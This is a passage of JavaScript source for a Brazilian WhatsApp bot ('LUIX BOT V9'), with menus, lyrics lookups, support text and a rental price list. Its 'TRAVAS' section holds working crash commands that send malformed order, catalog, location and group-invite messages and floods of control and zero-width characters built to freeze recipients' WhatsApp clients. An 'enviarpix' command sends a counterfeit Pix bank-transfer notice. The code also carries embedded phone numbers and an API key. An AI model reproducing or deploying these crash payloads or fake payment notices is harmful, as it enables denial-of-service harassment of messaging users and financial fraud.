║     ᬊ᭄𝐄𝐅𝐄𝐈𝐓𝐎𝐒 𝐈𝐌𝐀𝐆𝐄𝐍𝐒ᬊ᭄
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╝
║⩺ ${prefix}Legenda (marcar)-(img)
║⩺ ${prefix}Procurado (marcar)-(img)
║⩺ ${prefix}Hitler (marcar)-(img)
║⩺ ${prefix}Preso (marcar)-(img)
║⩺ ${prefix}Lixo (marcar)-(img)
║⩺ ${prefix}Deletef (marcar)-(img)
║⩺ ${prefix}Morto (marcar)-(img) 
║⩺ ${prefix}Lgbt (marcar)-(img) 
`}, {quoted: selo}) 	
break

case 'menudono':    		
img = fs.readFileSync('./luixbt.jpg')  

conn.sendMessage(from,{image:img,caption: `
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╗
║     ᬊ᭄𝐌𝐄𝐍𝐔 𝐃𝐎𝐍𝐎ᬊ᭄
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╝
║⩺ ${prefix}fotomenu (marca-img)
║⩺ ${prefix}blockcmd  (cmd)
║⩺ ${prefix}unblockcmd (cmd)
║⩺ ${prefix}legendabv (oq qr)
║⩺ ${prefix}legendasaiu (oq qr)
║⩺ ${prefix}legendasaiu2 (oq qr)
║⩺ ${prefix}legendabv2 (oq qr)
║⩺ ${prefix}prefixo_tipo2 simbolo
║⩺ ${prefix}prefixo_tipo_off
║⩺ ${prefix}fundobemvindo (marcar-img)
║⩺ ${prefix}fundosaiu (marcar-img)
║⩺ ${prefix}serpremium
║⩺ ${prefix}listagp
║⩺ ${prefix}antipalavrão 1 / 0
║⩺ ${prefix}antiligar 1 / 0
║⩺ ${prefix}antipv 1 / 0 (esse da block)
║⩺ ${prefix}addpalavra (palavrão)
║⩺ ${prefix}delpalavra (palavrão)
║⩺ ${prefix}antipvon
║⩺ ${prefix}antipvoff
║⩺ ${prefix}ativo
║⩺ ${prefix}ausente (fale-oq-faz)
║⩺ ${prefix}delpremium @(marca)
║⩺ ${prefix}addpremium @(marca)
║⩺ ${prefix}clonar [@] (rouba ft de prf)
║⩺ ${prefix}fotobot (img, = foto do BT)
║⩺ ${prefix}descriçãogp (digite-algo)
║⩺ ${prefix}limpar (limpa tds conversas)
║⩺ ${prefix}block [@] (bloq de usar cmds) 
║⩺ ${prefix}unblock [@] (desbloquear) 
║⩺ ${prefix}setprefix  (prefixo-novo)
║⩺ ${prefix}bangp
║⩺ ${prefix}unbangp
║⩺ ${prefix}dono2 @marca
║⩺ ${prefix}dono3 @marca
║⩺ ${prefix}dono4 @marca
║⩺ ${prefix}dono5 @marca
║⩺ ${prefix}bcgp (TM-PRA-PV-MEMBROS)
║
╰─────────────╯
`}, {quoted: selo}) 		
break

case 'info7':
img = fs.readFileSync('./luixbt.jpg')  

conn.sendMessage(from,{image:img,caption: `
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╗
║     ᬊ᭄𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂̧𝐎̃𝐄𝐒ᬊ᭄
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╝
║𖢼⩺ ${prefix}Infobot
║𖢼⩺ ${prefix}Idiomas 
║𖢼⩺ ${prefix}Bug (QUESTIONE) 
║𖢼⩺ ${prefix}Sugestao (DICA) 
║𖢼⩺ ${prefix}Avalie (O-QUAO-BOM) 
`}, {quoted: selo}) 	
break
//////////////////////////TRAVAS////////////////////
case 'crashpythonbug':
conn.sendMessage( from, { document: { url: `./travas/py.zip`}, mimetype: 'application/nu', fileName: `${NickDono}.py${trava()}`,  },  { quoted: selo6 })
break

case 'crashcarrinho':
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./travas/oi.jpeg') }, { upload: conn.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage":{"orderId":"3648563358700955","thumbnail":
fs.readFileSync('./travas/oi.jpeg'),
"itemCount":1,
"status":"INQUIRY",
"surface":"CATALOG",
"message":`${NickDono} ${trava()} `,
"orderTitle":`${NickDono} ${trava()} `,
"sellerJid":"557998279117@s.whatsapp.net",
"token":"AR4flJ+gzJw9zdUj+RpekLK8gqSiyei/OVDUFQRcmFmqqQ==",
"totalAmount1000":"5000000",
"totalCurrencyCode":"BRL",
"contextInfo":{"expiration":604800,"ephemeralSettingTimestamp":"1679959486","entryPointConversionSource":"global_search_new_chat","entryPointConversionApp":"whatsapp","entryPointConversionDelaySeconds":9,"disappearingMode":{"initiator":"CHANGED_IN_CHAT"}}}
}), { userJid: conn.user.id})
conn.relayMessage(from,order.message, { messageId: order.key.id })
break

case 'crashaudiobug':
conn.sendMessage(from,  {  "caption": `${NickDono} ${trava()} `, audio: {url: './audios/abelha.m4a'},mimetype: 'audio/mpeg', ptt:false,
"title":`${NickDono} ${trava()} `,
 "thumbnail": fs.readFileSync('./luixft.jpg'),
"quoted": info,
"contextInfo": { 
"forwardingScore": 508, "isForwarded": true,
"externalAdReply":{ 
"title": `${NickDono} ${trava()} `,
"text": "⚡",
"description": `Melhor base para bot de travas da web`,
"body": "Melhor base para bot de travas da web", 
"mediaType": 0, 
"thumbnail": fs.readFileSync('./luixft.jpg'),
"MediaUrl": `https://Wa.me/stickerpack/whatsappcuppy`,
"sourceType": 33,
"sourceUrl": `https://Wa.me//stickerpack/whatsappcuppy`
}}},
{quoted: info}
)
break

case 'crashcatalogo': {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./luixftt.jpg') }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `${NickDono} ${trava()} `,
"description": `${NickDono} ${trava()} `,
"currencyCode": `RS`,
"footerText": `${NickDono} ${trava()} `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `${NickDono}d `,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: from })
conn.relayMessage(from, catalog.message, { messageId: catalog.key.id })
}
break

case 'crashliveloc':
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./travas/oi.jpeg') }, { upload: conn.waUploadToServer })
var loc = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -18.49335858,
"degreesLongitude": -62.19109138,
"caption": `${NickDono} ${trava()} `,
"sequenceNumber": "1680110670076001",
"jpegThumbnail": fs.readFileSync('./travas/oi.jpeg'),
}}), { userJid: conn.user.id})
conn.relayMessage(from,loc.message, { messageId: loc.key.id })
break

case 'crashconvite':
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./travas/oi.jpeg') }, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `${NickDono} ${trava()} `,
"groupName": `${NickDono} ${trava()} `,
"caption": `${NickDono} ${trava()} `,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from })
conn.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
break

case 'crashwebpag':
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./travas/oi.jpeg') }, { upload: conn.waUploadToServer })
var oi = generateWAMessageFromContent(from, proto.Message.fromObject({
"extendedTextMessage":{"text":`${NickDono} ${trava()} `,
contextInfo: {externalAdReply : {
title : `${NickDono} ${trava()} `,
body : `${NickDono} ${trava()} `,
renderLargerThumbnail:false,
showAdAttribution: true, 
mediaUrl: `https://google.com`, 
mediaType: 2, 
thumbnail: fs.readFileSync("./luixft.jpg")
}}}}), { userJid: conn.user.id})
conn.relayMessage(from,oi.message, { messageId: oi.key.id })
break
case 'crashloc':
conn.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${NickDono} ${trava()} `,addrees: 'sla kkkk'}},{quoted: selo})
break
case 'crashfig':
conn.sendMessage(from, {sticker: fs.readFileSync('./pixgratis.webp')}, {quoted: selo6});
break

///////////////////////////////////TRAVAS////////////////////////////////////////////
case 'menufigu':
case 'figurinhas':    		
img = fs.readFileSync('./luixbt.jpg')  

conn.sendMessage(from,{image:img,caption: `
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╗
║     ᬊ᭄𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒ᬊ᭄
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╝
║𖢼⩺ ${prefix}Attp (TEXTO)
║𖢼⩺ ${prefix}Attp2 (TEXTO)
║𖢼⩺ ${prefix}Attp3 (TEXTO)
║𖢼⩺ ${prefix}Attp4 (TEXTO)
║𖢼⩺ ${prefix}Attp5 (TEXTO)
║𖢼⩺ ${prefix}Attp6 (TEXTO)
║𖢼⩺ ${prefix}Ttp (TEXTO)
║𖢼⩺ ${prefix}Fsticker (MARCAR-FOTO)
║𖢼⩺ ${prefix}Sticker (MARCAR-FOTO)
║𖢼⩺ ${prefix}Toimg (MARCAR-FIGU)
║𖢼⩺ ${prefix}Togif (MARCAR-FIGU)
║𖢼⩺ ${prefix}Roubar (TEXT/TEXT)
`}, {quoted: selo}) 
break
case 'enviarpix':{
if(!SoDono) return reply("Você não é dono para utilizar este comando...")
txt = args.join(" ")
let luix2 = txt.split("/")[0].replace(/\D/g,'');
let Luix = txt.split("/")[1];
if (!sasah1) return reply('Chave pix da pessoa/número de telefone?')
if (!sasah2) return reply('Qual é o valor que você deseja transferir?')
let [result] = await conn.onWhatsApp(luix2)
if (!result) return reply(`Número inválido!`)
bla = `— *Um pix enviado para você, veja a origem abaixo:*\n▢ ⌁ Origem do Pix: ${pushname}\n▢ ⌁ Banco: ${NomeDoBot}️\n▢ ⌁ Tarifa de Transferência: Gratuita\n▢ ⌁ Transf. realizada às: ${time}\n▢ ⌁ Valor encaminhado: R$${Luix},00`
conn.sendMessage(result.jid, {text: bla, buttons: [{buttonId: `${prefix}addsaldo${Luix}`, buttonText: {displayText: '『👻』 𝐂𝐨𝐧𝐟𝐢𝐫𝐦𝐚𝐫 𝐏𝐢𝐱 『👻』'}, type: 1}]}, {quoted: info})
}
break
case 'letra2': case 'lyrics2': case 'letramusic2':
try {
if (!q) return reply(`É o nome da música? Exemplo: ${prefix + command} the perfect girl`)
letrakk = await fetchJson(`https://apis.nezsab-apis.xyz/api/letramusic?apikey=apikey_LuixxLindo-2023&query=${q}`)
letra = `*🎶🎙 𝐋𝐄𝐓𝐑𝐀 𝐃𝐀 𝐌𝐔́𝐒𝐈𝐂𝐀 🎙🎶*\n\n*▢ ⌁ Nome da Música:* ${letrakk.resultado.nomedamusica}\n*▢ ⌁ Cantor:* ${letrakk.resultado.nomedocantor}\n\n${letrakk.resultado.letradamusica}`
conn.sendMessage(from, {image:{url: `${logo}`}, caption:letra})
} catch (e) {
if(String(e).includes("corpo de resposta json inválido em")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('Música não encontrada ou a api caiu! Tente novamente com outra música!')
}
}
break

case 'letra': case 'lyrics': case 'letramusic':
try {
if (!q) return reply(`É o nome da música? Exemplo: ${prefix + command} Anna Júlia`)
letrakk = await fetchJson(`https://apis.nezsab-apis.xyz/api/v2/letramusic?apikey=apikey_LuixxLindo-2023&query=${q}`)
letra = `*🎶🎙 𝐋𝐄𝐓𝐑𝐀 𝐃𝐀 𝐌𝐔́𝐒𝐈𝐂𝐀 🎙🎶*\n▢ ⌁ *Nome da Música:* ${letrakk.resultado.NomeDaMusica}\n*▢ ⌁ Nome do Artista:* ${letrakk.resultado.artistaMusic}\n\n${letrakk.resultado.LetraMusic}`
conn.sendMessage(from, {image:{url: `${letrakk.resultado.imagem}`}, caption:letra}, {quoted: selo})
} catch (e) {
if(String(e).includes("corpo de resposta json inválido em")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('Música não encontrada ou a api caiu! Tente novamente com outra música!')
}
}
break
case 'suportebot':		
conn.sendMessage(from, { react: { text: `⚠️`, key: info.key }})
img = fs.readFileSync('./luixft.jpg')  

conn.sendMessage(sender,{image:img,caption: `『🌟』 *caso tenha alguma duvida ou precise de ajuda entre no no nosso grupo:* https://chat.whatsapp.com/G8uPsitimsOEngAiydOyoq\nNome: 🗣️𝐒𝐔𝐏𝐎𝐑𝐓𝐄 𝐋𝐗🤖\nDono: ❥͜𝐋𝐔𝐈𝐗 〤 𝐌𝐆 🛠️
`}) 
reply('*SUPORTE INVIANDO NO SEU PRIVADO🛠️')
case 'suporte': {
sections = [
    {
	title: "🇸 🇺 🇵 🇴 🇷 🇹 🇪   🇴 🇫 🇮 🇨 🇮 🇦 🇱 ",
	rows: [
	    {title: "『☕』 𝑪𝒐𝒎𝒂𝒏𝒅𝒐𝒔 𝒅𝒆 𝒊𝒏𝒔𝒕𝒂𝒍𝒂çã𝒐 𝒅𝒐 𝒃𝒐𝒕.", rowId: `${prefix}suporte-termux`, description: "Instalação do Luix Bot no Termux."},
	    {title: "『☕』 𝑯𝒐𝒔𝒑𝒆𝒅𝒂𝒈𝒆𝒎 𝒅𝒐 𝒃𝒐𝒕 𝒏𝒐 𝑯𝒆𝒓𝒐𝒌𝒖.", rowId: `${prefix}suporte-hospedar`, description: "Comandos para hospedar no Heroku."},
	        {title: "『☕』 𝑮𝒓𝒖𝒑𝒐 𝒑𝒂𝒓𝒂 𝒔𝒖𝒑𝒐𝒓𝒕𝒆 𝒅𝒐 𝑳𝒖𝒊𝒙.", rowId: `${prefix}suporte-grupo`, description: "Meu grupo para dúvidas e suporte."},
	        {title: "『☕』 𝑨𝒑𝒍𝒊𝒄𝒂𝒕𝒊𝒗𝒐𝒔 𝒏𝒆𝒄𝒆𝒔𝒔á𝒓𝒊𝒐𝒔 𝒅𝒐 𝒃𝒐𝒕.", rowId: `${prefix}suporte-apps`, description: "Link dos aplicativos necessários do bot."},
	        {title: "『☕』 𝑪𝒐𝒎𝒐 𝒇𝒂𝒛𝒆𝒓 𝒂𝒔 𝒂𝒍𝒕𝒆𝒓𝒂çõ𝒆𝒔 𝒏𝒐 𝒃𝒐𝒕?", rowId: `${prefix}suporte-alterar`, description: "Ajuda na alteração de logos, dono e prefixo."},
	            {title: "『☕』 𝑪𝒐𝒏𝒕𝒂𝒕𝒐 𝒅𝒐 𝒎𝒆𝒖 𝒅𝒆𝒔𝒆𝒏𝒗𝒐𝒍𝒗𝒆𝒅𝒐𝒓.", rowId: `${prefix}criador`, description: "Contato do criador ou link do whatsapp."}]
},
]
 
const listMessage2 = {
text: `𝐀𝐤𝐢 𝐞𝐬𝐭á 𝐭𝐨𝐝𝐨𝐬 𝐨𝐬 𝐬𝐮𝐩𝐨𝐫𝐭𝐞𝐬 𝐝𝐢𝐬𝐩𝐨𝐧í𝐯𝐞𝐢𝐬 𝐝𝐨 𝐛𝐨𝐭.`,
  footer: `${NomeDoBot}`,
  title: `『👋🏻』 ${tempo}, *${pushname}*`,
  buttonText: "🧃𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧃️",
  sections
}
sendMsg = await conn.sendMessage(from, listMessage2, {quoted: selo2})
}
break

case 'suporte-termux':
reply ("[🔒] *INSTALAÇÃO DO BOT NO TERMUX:*\n*Primeiro comando:*\npkg upgrade -y && pkg update -y && pkg install git -y && pkg install nodejs -y && pkg install nodejs-lts -y\n*Segundo comando:*\ntermux-setup-storage\n*Terceiro comando:*\ncd /sdcard/LUIX-BOTV9 *ou* cd /sdcard/Download/LUIX-BOTV9/n*Quarto comando:*\npkg install ffmpeg -y && pkg install tesseract -y && pkg install python -y\n*Quinto comando:*\npkg install ffmpeg -y && pkg install wget -y \n*Chave para iniciar o bot:*\nsh start.sh *ou* npm start")
break

case 'suporte-hospedar':
reply ("[📝] *HOSPEDAR BOT NO HEROKU:*\n\nPara hospedar de forma rápida e prática no heroku use o comando no termux: *sh hospedar.sh*\n\n*Tutorial de como hospedar seu bot no heroku:* https://youtu.be/Apzqy3tuLtY")
break

case 'grupo-bot':
case 'suporte-grupo':
reply ("*GRUPO PARA SUPORT:* https://chat.whatsapp.com/G8uPsitimsOEngAiydOyoq")
break

case 'suporte-apps':
reply ("『📍』 *APLICATIVOS NECESSÁRIOS:* \n\n*Download do Termux V0.119:* https://www.mediafire.com/file/0npdmv51pnttps0/com.termux_0.119.1-119_minAPI21(arm64-v8a,armeabi-v7a,x86,x86_64)(nodpi)_apkmirror.com.apk/file\n\n*Download do MT-Manager V2.10:* https://www.mediafire.com/file/0fttexpjoe3j54h/MT_Manager_Version_%255B_2.10.3_%255D_.apk/file")
break

case 'suporte-alterar':
reply (`[] *ALTERAÇÕES NO BOT:*\n\n*Alterar prefixo:* Entre no arquivo *configure aqui.js* e procure por *global.prefix*, como padrão vai ter *"."*\nVocê só apaga isso o . e coloca o prefixo que você desejar.\n\n*Alterar número do dono:* Entre no arquivo *configure aqui.js* e procure por *setting.numerodono* e coloque seu número entre às aspas.\n\n*Alterar logo:* Entre no arquivo *configure aqui.js*, procure por essas três definições: *global.err4r, global.logo, global.thumb*, Inicie o bot e mande a imagem que você deseja e mencione a foto enviada com o comando: ${prefix}imgpralink, depois copie o link enviado e cole nas *" "* dessas 3 definições.`)
break
break
case 'alnugar':
case 'conmprar':    		
img = fs.readFileSync('./luixft.jpg')  

conn.sendMessage(from,{image:img,caption: `​

*╔═══❖•ཌ💎🔥ད•❖═══╗*
   *ঔৣ͜͡ீ͜❥͜𝐋𝐔𝐈𝐗 𝐁𝐎𝐓 𝐕𝟗 ू ፝͜❥*
*╚═══❖•ཌ💎🔥ད•❖═══╝*

*[💞]  BOT DE WHATSAPP 24H ON*
*[💞]  SUPORTE 100% DISPONÍVEL*
*[💞]  ORGANIZE SEU GRUPO*
*[💞]  GERENCIE SEU GRUPO*
*[💞]  PROTEJA SEU GRUPO*
*[💞]  DEIXE SEU GRUPO MAIS ANIMADO*

*____________ᬊᬁP L A N O Sᬊᬁ____________*

*[💞] TESTE 1 DIA:* R$ 01,00
*[💞] SEMANAL:* R$ 05,00
*[💞] MENSAL:* R$ 15,00
*[💞] ARQUIVOS:* R$ 30,00
*[💞] PREMIUM* R$ 35,00

*____________ᬊᬁPROTEÇÕESᬊᬁ____________*

*[💞] ANTI-LINK*
*[💞] ANTI-FAKE*
*[💞] ANTI-CONTATO*
*[💞] ANTI-LOCALIZAÇÃO*
*[💞] ANTI-DOCUMENTO*
*[💞] ANTI-VIDEO*
*[💞] ANTI-IMAGEM*
*[💞] ANTI-AUDIO*
*[💞] ANTI-VIEWONCE*

*____________ᬊᬁRECURSOSᬊᬁ____________*
*[💞] CRIAR FIGURINHAS*
*[💞] BAIXAR MÚSICAS*
*[💞] BAIXAR VIDEOS*
*[💞] ABRIR/FECHAR GRUPO COM TIME*
*[💞] BAN & KICK*
*[💞] BRINCADEIRAS*
*[💞] COMANDOS +🔞*
*[💞] FIGURINHAS INTERATIVAS*
*[💞] ÁUDIOS DE AUTO-RESPOSTA*

*____________ᬊᬁCONTRA-TEᬊᬁ____________*
*[⚡] DONO OFICIAL:* *𝐋𝐔𝐈𝐗*
*[⚡] CHAT:* wa.me/5516997357601
*[⚡] INSTA:* @Luixx__mg

*__ᬊᬁঔৣ͜͡ீ͜❥͜𝐋𝐔𝐈𝐗 𝐁𝐎𝐓 𝐕𝟗ू ፝͜❥ᬊᬁ__*
`}) 
reply('*aguarde um momento 🥂*')    		
break
//case 'puxadas':
//conn.sendMessage(from, { react: { text: `💎`, key: info.key }})
//sendBimg(from, `${logo}`, efeitos(prefix), `🌀`, [
//{buttonId: `${prefix}alugar`, buttonText: //{displayText: ` 💎𝐀𝐋𝐔𝐆𝐀𝐑 𝐁𝐎𝐓💎 `}, type: 1}, {buttonId: `${prefix}dono`, buttonText: {displayText: ` 🧙‍♂️𝐈𝐍𝐅𝐎 𝐃𝐎𝐍𝐎🧙‍♂️️ `}, type: 1}, {buttonId: `${prefix}menu`, buttonText: {displayText: `🌟𝐌𝐄𝐍𝐔 𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋🌟`}, type: 1}], selo)
//break 

case 'Qrpix5reais':  
sendBimg(from, `./Logos/qrcode.jpg`, menudono(prefix), `🌀`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `💫 Menu principal`}, type: 1}, {buttonId: `${prefix}dono`, buttonText: {displayText: `💸 Dono `}, type: 1}], selo)
break 
case 'criador':
img = fs.readFileSync('./luixbt.jpg')  

conn.sendMessage(sender,{image:img,caption: `*╔══•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•══╗*
         ᬊ᭄𝐌𝐄𝐔 𝐂𝐑𝐈𝐀𝐃𝐎𝐑ᬊ᭄
*╚══•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•══╝*
_𝙰𝚚𝚞𝚒  𝙴𝚜𝚝𝚊́ 𝙰𝚕𝚐𝚞𝚖𝚊𝚜 𝙸𝚗𝚏𝚘𝚛𝚖𝚊𝚌̧𝚘̃𝚎𝚜 𝚂𝚘𝚋𝚛𝚎 𝙼𝚎𝚞 𝙳𝚘𝚗𝚘._

*║ঔৣ͜͡ீ͜❥͜𝐍𝐎𝐌𝐄:* ❥͜𝐋𝐔𝐈𝐗 〤 𝐌𝐆
*║ঔৣ͜͡ீ͜❥͜𝐂𝐇𝐀𝐓:* wa.me/5516997357601
*║ঔৣ͜͡ீ͜❥͜𝐄𝐒𝐓𝐀𝐃𝐎:* São Paulo 

*║ঔৣ͜͡ீ͜❥͜𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌:* @Luixx__mg
*║ঔৣ͜͡ீ͜❥͜𝐋𝐈𝐍𝐊:* https://instagram.com/luixx__mg?igshid=ZDdkNTZiNTM=

*║ঔৣ͜͡ீ͜❥͜𝐘𝐎𝐔𝐓𝐔𝐁𝐄:* @Luix1397
*║ঔৣ͜͡ீ͜❥͜𝐋𝐈𝐍𝐊:* https://youtube.com/@Luix1397

*║ঔৣ͜͡ீ͜❥͜𝐆𝐑𝐔𝐏𝐎 𝐎𝐅𝐈𝐂𝐈𝐀𝐋 𝐃𝐎 ͜𝐁𝐎𝐓:* 
*║ঔৣ͜͡ீ͜❥͜𝐋𝐈𝐍𝐊:* https://chat.whatsapp.com/Juf33LLNpxiJEkWh7154RK
*║ঔৣ͜͡ீ͜❥͜𝐌𝐔𝐒𝐈𝐂𝐀 𝐅𝐀𝐕𝐎𝐑𝐈𝐓𝐀 𝐃𝐎 𝐌𝐄𝐔 𝐂𝐑𝐈𝐀𝐃𝐎𝐑:*
*║ঔৣ͜͡ீ͜❥͜𝐋𝐈𝐍𝐊:* https://youtu.be/--eH76tgoNw

*║ঔৣ͜͡ீ͜❥͜𝐏𝐄𝐑𝐒𝐎𝐍𝐀𝐆𝐄𝐌 𝐅𝐀𝐕𝐎𝐑𝐈𝐓𝐎 𝐃𝐎 𝐂𝐑𝐈𝐀𝐃𝐎𝐑*
*║ঔৣ͜͡ீ͜❥͜𝐍𝐎𝐌𝐄:* tommy shelby 
`}, {quoted: info}) 
{

reply('『💎』𝐂𝐑𝐈𝐀𝐃𝐎𝐑 𝐈𝐍𝐕𝐈𝐀𝐍𝐃𝐎 𝐍𝐎 𝐒𝐄𝐔 𝐏𝐑𝐈𝐕𝐀𝐃𝐎')    		


                let vcard = 'BEGIN:VCARD\n' 


                    + 'VERSION:3.0\n' 


                    + 'N:;❥͜𝐋𝐔𝐈𝐗 〤 𝐌𝐆;;;'


                    + 'FN:❥͜𝐋𝐔𝐈𝐗 〤 𝐌𝐆\n' 


                    + 'ORG:❥͜𝐋𝐔𝐈𝐗 〤 𝐌𝐆;\n' 


                    + 'TEL;type=CELL;type=VOICE;waid=5516997357601:+55 16 99735-7601\n' // WhatsApp ID + número


                    + 'END:VCARD' 


                    


                conn.sendMessage(sender, { contacts: { displayName: ' ❥͜𝐋𝐔𝐈𝐗🧙🏽‍♂️ ', contacts: [{ vcard }] } }, { quoted: info })


            }
            break
case 'criador2':{
reply('『💨』𝐈𝐍𝐕𝐈𝐀𝐍𝐃𝐎 𝐍𝐎 𝐒𝐄𝐔 𝐏𝐑𝐈𝐕𝐀𝐃𝐎')    		


                let vcard = 'BEGIN:VCARD\n' 


                    + 'VERSION:3.0\n' 


                    + 'N:;❥͜𝐋𝐔𝐈𝐗 〤 𝐌𝐆;;;'


                    + 'FN:❥͜𝐋𝐔𝐈𝐗 〤 𝐌𝐆\n' 


                    + 'ORG:❥͜𝐋𝐔𝐈𝐗 〤 𝐌𝐆;\n' 


                    + 'TEL;type=CELL;type=VOICE;waid=5516997357601:+55 16 99735-7601\n' // WhatsApp ID + número


                    + 'END:VCARD' 


                    


                conn.sendMessage(sender, { contacts: { displayName: ' ❥͜𝐋𝐔𝐈𝐗🧙🏽‍♂️ ', contacts: [{ vcard }] } }, { quoted: selo2 })


            }
            break

case 'donosamp':{
reply('『💨』𝐈𝐍𝐕𝐈𝐀𝐍𝐃𝐎 𝐍𝐎 𝐒𝐄𝐔 𝐏𝐑𝐈𝐕𝐀𝐃𝐎')    		


                let vcard = 'BEGIN:VCARD\n' 


                    + 'VERSION:3.0\n' 


                    + 'N:;João Vitor;;;'


                    + 'FN:João Vitor\n' 


                    + 'ORG:João Vitor;\n' 


                    + 'TEL;type=CELL;type=VOICE;waid=5527993166914:+55 27 99316-6914\n' // WhatsApp ID + número


                    + 'END:VCARD' 


                    


                conn.sendMessage(sender, { contacts: { displayName: ' ❥͜𝐋𝐔𝐈𝐗🧙🏽‍♂️ ', contacts: [{ vcard }] } }, { quoted: samp })


            }
            break
            
case 'alteradores':
await conn.sendMessage(from, {image: {url: logo}, caption: alteradores(prefix)}, {quoted: selo})
break 

case 'brincadeiras':
case 'brincadeira':
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/menubrincadeira.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
}
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`) 
await conn.sendMessage(from, {image: {url: logo}, caption: brincadeiras(prefix)}, {quoted: selo})
break 
case 'puxadas':
case 'Puxadas':
conn.sendMessage(from, { react: { text: `🔎️`, key: info.key }})
const buttons = [
{buttonId: `${prefix}menu`, buttonText: {displayText: '🌟𝐌𝐄𝐍𝐔 𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋🌟'}, type: 1},
{buttonId: `${prefix}pix`, buttonText: {displayText: '🔎❥͜𝐂𝐎𝐌𝐏𝐑𝐀𝐑 𝐏𝐔𝐗𝐀𝐃𝐀𝐒🔍'}, type: 1}]
if(!isPuxadas) return reply(`Este tipo de comando só pode ser utilizado com o ${prefix}Puxas 1 ativo, fale com meu dono para alugar`)
await conn.sendMessage(from, {image: {url: logo}, caption: hospedar(prefix)}, {quoted: selo})
break 
case 'menupremium':
case 'menuprem':
await conn.sendMessage(from, {text: menuprem(prefix)}, {quoted: selo})
break

case 'configurar-bot':
await conn.sendMessage(from, {text: configbot(prefix)}, {quoted: selo})
break

case 'loc': {// 𝙘𝙖𝙨𝙚 𝙗𝙮 𝙫𝙚𝙣𝙤𝙢
conn.sendMessage(
from, {location: { degreesLatitude: -9.9999999, 
degreesLongitude: -9.9999999
}},
{quoted: selo}
)
}
break

case 'comandos-termux':
await conn.sendMessage(from, {text: cmd_termux(prefix)}, {quoted: selo})
break
//TRAVAS
case 'suicidagp': case 'matargp': case 'crashgp': case 'crashgrupo':
const { buttonkal } = require('./armor/funcoes/buttonkal.js')
 const { travavideo } = require('./armor/funcoes/travavideo.js')
if(!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply(enviar.msg.donosmt)
reply('『👻』𝐋͢𝐔𝐈𝐗 𝚯͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟𝐍𝐃𝚯 𝐖𝜮𝐁ꫂ') 
let audcrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: 1397, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}\n${travavideo}`, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
conn.sendMessage(from, {text: '『👻』𝐋͢𝐔𝐈𝐗 𝚯͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟𝐍𝐃𝚯 𝐖𝜮𝐁ꫂ'}, { quoted: selo}) 
break
case 'travacrash':
try {
if(!SoDono) return reply("Quem é você?")
if(q && args[0] === "-fake") {
teks = ""
for (var i = 0; i < 10; i++) {
teks += "💤"
}
tekks = ""
for (var i = 0; i < 100; i++) {
tekks += "؅؀؁؂؃؄"
}
tekkss = ""
for (var i = 0; i < 800; i++) {
tekkss += "‍"
}
let buttons = [
{buttonId: `ꪶ͢͜😈𝐋͢𝐔𝐈𝐗 𝑶͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟😈ꫂ`, buttonText: {displayText: teks}, type: 1},
{buttonId: `ꪶ͢͜💦𝐋͢𝐔𝐈𝐗 𝑶͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟💦ꫂ`, buttonText: {displayText: teks}, type: 1},
